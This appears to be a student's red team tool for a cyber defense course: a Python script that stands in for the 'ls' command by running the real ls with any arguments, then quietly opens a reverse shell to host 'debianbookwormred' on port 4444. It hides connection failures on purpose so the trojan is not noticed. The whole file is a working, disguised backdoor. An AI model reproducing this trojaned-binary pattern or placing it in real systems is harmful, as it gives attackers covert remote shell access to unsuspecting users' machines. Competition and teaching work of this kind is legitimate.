# Daniel Wolosiuk
# Cyber Defense Techniques 2025 Red Team Tool
# Oct 17, 2025
# dw4102@rit.edu

import subprocess
import sys
import socket
import os
import pty


def main():
    args = sys.argv[1:]
    run_real_ls(args)
    malicious_component()

def run_real_ls(arguments):
    ls_command_with_args = ["ls", "--color=auto"]
    ls_command_with_args.extend(arguments)
    ls_result = subprocess.call(ls_command_with_args)

def malicious_component():
    RHOST="debianbookwormred"
    RPORT=4444
    s=socket.socket()
    try:
        s.connect((RHOST, RPORT))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        subprocess.Popen(["/bin/sh"], stdin=s, stdout=s, stderr=s)
    except socket.error:
        return None # handle the error silently to not give the binary away

 
if __name__ == "__main__":
    main()